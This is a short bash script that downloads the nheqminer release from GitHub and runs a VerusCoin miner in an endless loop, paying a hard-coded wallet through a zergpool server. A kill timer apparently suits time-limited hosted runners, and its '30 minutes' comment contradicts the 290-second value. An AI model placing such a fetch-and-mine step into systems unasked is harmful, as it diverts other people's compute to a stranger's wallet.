#!/bin/bash

Timeout=290 # 30 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tar.gz
cd nheqminer
while [ 1 ]; do
./nheqminer -v -l verushash.eu.mine.zergpool.com:3300 -u RSBmzzfgzomxwx7o6tJNmG3kecq9Huc7Q9 -p c=VRSC,mc=VRSC,ID=Zerg -t 3
sleep 3
done
sleep 999
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
exit
